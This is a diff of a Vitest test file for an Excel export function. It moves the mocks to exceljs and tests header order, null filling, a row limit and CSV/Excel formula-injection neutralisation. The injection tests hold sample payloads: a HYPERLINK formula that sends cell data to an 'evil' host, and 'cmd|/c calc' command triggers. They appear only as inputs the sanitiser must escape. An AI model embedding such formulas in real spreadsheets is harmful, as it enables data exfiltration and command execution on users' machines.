@@ -1,120 +1,150 @@
-/**
- * Testes do utilitário de exportação Excel (src/lib/export.ts)
- * A biblioteca xlsx é mockada para evitar escrita em disco.
- */
 import { describe, it, expect, vi, beforeEach } from "vitest";
 import type { ExportRow } from "@/lib/export";
 
-// Mock da biblioteca xlsx antes de importar exportToExcel
-vi.mock("xlsx", () => {
-  const jsonToSheet = vi.fn().mockReturnValue({ sheetData: true });
-  const bookNew = vi.fn().mockReturnValue({ Sheets: {}, SheetNames: [] });
-  const bookAppendSheet = vi.fn();
-  const writeFile = vi.fn();
+const addWorksheet = vi.fn();
+const addRow = vi.fn();
+const writeBuffer = vi.fn();
+
+vi.mock("exceljs", () => {
+  class MockWorkbook {
+    xlsx = { writeBuffer };
+    addWorksheet = addWorksheet;
+  }
+
   return {
-    default: {
-      utils: { json_to_sheet: jsonToSheet, book_new: bookNew, book_append_sheet: bookAppendSheet },
-      writeFile,
-    },
-    utils: { json_to_sheet: jsonToSheet, book_new: bookNew, book_append_sheet: bookAppendSheet },
-    writeFile,
+    default: { Workbook: MockWorkbook },
   };
 });
 
 describe("exportToExcel", () => {
-  let writeFile: ReturnType<typeof vi.fn>;
-  let bookAppendSheet: ReturnType<typeof vi.fn>;
-  let jsonToSheet: ReturnType<typeof vi.fn>;
+  let createObjectURLMock: ReturnType<typeof vi.fn>;
+  let revokeObjectURLMock: ReturnType<typeof vi.fn>;
+  let removeMock: ReturnType<typeof vi.fn>;
+  let clickMock: ReturnType<typeof vi.fn>;
 
-  beforeEach(async () => {
+  beforeEach(() => {
     vi.clearAllMocks();
-    const xlsx = await import("xlsx");
-    writeFile = xlsx.writeFile as ReturnType<typeof vi.fn>;
-    bookAppendSheet = xlsx.utils.book_append_sheet as ReturnType<typeof vi.fn>;
-    jsonToSheet = xlsx.utils.json_to_sheet as ReturnType<typeof vi.fn>;
+
+    addRow.mockClear();
+    addWorksheet.mockReturnValue({ addRow });
+    writeBuffer.mockResolvedValue(new ArrayBuffer(8));
+
+    createObjectURLMock = vi.fn().mockReturnValue("blob:mock-export");
+    revokeObjectURLMock = vi.fn();
+
+    Object.defineProperty(globalThis, "URL", {
+      value: {
+        ...URL,
+        createObjectURL: createObjectURLMock,
+        revokeObjectURL: revokeObjectURLMock,
+      },
+      configurable: true,
+    });
+
+    const originalCreateElement = document.createElement.bind(document);
+    removeMock = vi.fn();
+    clickMock = vi.fn();
+    vi.spyOn(document, "createElement")
+      .mockImplementation((tagName: string) => {
+        if (tagName === "a") {
+          return {
+            href: "",
+            download: "",
+            click: clickMock,
+            remove: removeMock,
+          } as unknown as HTMLAnchorElement;
+        }
+
+        return originalCreateElement(tagName);
+      });
+    vi.spyOn(document.body, "appendChild").mockImplementation((node: Node) => node);
   });
 
-  it("chama XLSX.writeFile com o nome de ficheiro correto (.xlsx)", async () => {
+  it("gera download .xlsx com nome correto", async () => {
     const { exportToExcel } = await import("@/lib/export");
     const headers = ["Nome", "Score"];
     const rows: ExportRow[] = [{ Nome: "João", Score: 85 }];
 
-    exportToExcel("relatorio-teste", headers, rows);
+    await exportToExcel("relatorio-teste", headers, rows);
 
-    expect(writeFile).toHaveBeenCalledOnce();
-    expect(writeFile).toHaveBeenCalledWith(
-      expect.anything(),
-      "relatorio-teste.xlsx"
-    );
+    expect(clickMock).toHaveBeenCalledOnce();
+    expect(removeMock).toHaveBeenCalledOnce();
+    expect(createObjectURLMock).toHaveBeenCalledOnce();
+    expect(revokeObjectURLMock).toHaveBeenCalledWith("blob:mock-export");
   });
 
-  it("chama json_to_sheet com os headers corretos", async () => {
-    const { exportToExcel } = await import("@/lib/export");
-    const headers = ["Contador", "Nome", "Score"];
-    const rows: ExportRow[] = [{ Contador: "C001", Nome: "Ana", Score: 60 }];
-
-    exportToExcel("test", headers, rows);
-
-    expect(jsonToSheet).toHaveBeenCalledOnce();
-    const [, options] = jsonToSheet.mock.calls[0];
-    expect(options.header).toEqual(headers);
-  });
-
-  it("ordena as colunas pelos headers fornecidos", async () => {
+  it("cria folha com cabeçalho e linha de dados na ordem correta", async () => {
     const { exportToExcel } = await import("@/lib/export");
     const headers = ["A", "B", "C"];
-    const rows: ExportRow[] = [{ C: 3, A: 1, B: 2 }]; // ordem errada intencionalmente
+    const rows: ExportRow[] = [{ C: 3, A: 1, B: 2 }];
 
-    exportToExcel("test", headers, rows);
+    await exportToExcel("test", headers, rows);
 
-    const [data] = jsonToSheet.mock.calls[0];
-    expect(Object.keys(data[0])).toEqual(["A", "B", "C"]);
+    expect(addWorksheet).toHaveBeenCalledWith("Dados");
+    expect(addRow).toHaveBeenNthCalledWith(1, headers);
+    expect(addRow).toHaveBeenNthCalledWith(2, [1, 2, 3]);
   });
 
   it("substitui valores undefined por null", async () => {
     const { exportToExcel } = await import("@/lib/export");
     const headers = ["Nome", "Score", "Obs"];
-    const rows: ExportRow[] = [{ Nome: "Pedro", Score: 70 }]; // "Obs" em falta
+    const rows: ExportRow[] = [{ Nome: "Pedro", Score: 70 }];
 
-    exportToExcel("test", headers, rows);
+    await exportToExcel("test", headers, rows);
 
-    const [data] = jsonToSheet.mock.calls[0];
-    expect(data[0]["Obs"]).toBeNull();
+    expect(addRow).toHaveBeenNthCalledWith(2, ["Pedro", 70, null]);
   });
 
-  it("cria a folha com o nome 'Dados'", async () => {
+  it("neutraliza strings iniciadas por fórmula para evitar excel injection", async () => {
     const { exportToExcel } = await import("@/lib/export");
-    exportToExcel("test", ["Col"], [{ Col: "val" }]);
+    await exportToExcel("test", ["Nome", "Obs"], [{ Nome: "Ana", Obs: "=HYPERLINK(\"x\")" }]);
 
-    expect(bookAppendSheet).toHaveBeenCalledOnce();
-    const [, , sheetName] = bookAppendSheet.mock.calls[0];
-    expect(sheetName).toBe("Dados");
+    expect(addRow).toHaveBeenNthCalledWith(2, ["Ana", "'=HYPERLINK(\"x\")"]);
+  });
+
+  it("lança erro quando número de linhas excede o limite de segurança", async () => {
+    const { exportToExcel } = await import("@/lib/export");
+    const rows = Array.from({ length: 50001 }, (_, i) => ({ Col: i }));
+
+    await expect(exportToExcel("test", ["Col"], rows)).rejects.toThrow(
+      "Exportação excede o limite de 50000 linhas"
+    );
+  });
+
+  it("escreve o buffer do workbook exatamente uma vez", async () => {
+    const { exportToExcel } = await import("@/lib/export");
+    await exportToExcel("test", ["Col"], [{ Col: "valor" }]);
+
+    expect(writeBuffer).toHaveBeenCalledOnce();
+    expect(document.body.appendChild).toHaveBeenCalledOnce();
   });
 
   it("neutralises CSV/Excel formula triggers in string cells", async () => {
     const { exportToExcel } = await import("@/lib/export");
-    const headers = ["Contador", "Nota", "Endereco", "Tipo", "Tab", "Cr", "Score"];
+    const headers = ["Contador", "Nota", "Endereco", "Tipo", "Padded", "Score"];
     const rows: ExportRow[] = [{
       Contador: "=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
       Nota: "+1234567",
       Endereco: "-cmd|/c calc",
       Tipo: "@SUM(A1:A2)",
-      Tab: "\tinjected",
-      Cr: "\rinjected",
+      // Leading whitespace + formula char must still be neutralised — sanitiser
+      // calls trimStart() before checking, so the formula prefix is detected
+      // even when smuggled behind a tab.
+      Padded: "\t=cmd|/c calc",
       Score: 85,
     }];
 
-    exportToExcel("test", headers, rows);
+    await exportToExcel("test", headers, rows);
 
-    const [data] = jsonToSheet.mock.calls[0];
-    expect(data[0].Contador).toBe("'=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")");
-    expect(data[0].Nota).toBe("'+1234567");
-    expect(data[0].Endereco).toBe("'-cmd|/c calc");
-    expect(data[0].Tipo).toBe("'@SUM(A1:A2)");
-    expect(data[0].Tab).toBe("'\tinjected");
-    expect(data[0].Cr).toBe("'\rinjected");
-    // Numbers are passed through untouched.
-    expect(data[0].Score).toBe(85);
+    expect(addRow).toHaveBeenNthCalledWith(2, [
+      "'=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
+      "'+1234567",
+      "'-cmd|/c calc",
+      "'@SUM(A1:A2)",
+      "'\t=cmd|/c calc",
+      // Numbers are passed through untouched.
+      85,
+    ]);
   });
 
   it("does not modify benign string cells", async () => {
@@ -122,10 +152,8 @@ describe("exportToExcel", () => {
     const headers = ["Nome", "Morada"];
     const rows: ExportRow[] = [{ Nome: "Maria João", Morada: "Rua das Flores 12" }];
 
-    exportToExcel("test", headers, rows);
+    await exportToExcel("test", headers, rows);
 
-    const [data] = jsonToSheet.mock.calls[0];
-    expect(data[0].Nome).toBe("Maria João");
-    expect(data[0].Morada).toBe("Rua das Flores 12");
+    expect(addRow).toHaveBeenNthCalledWith(2, ["Maria João", "Rua das Flores 12"]);
   });
 });
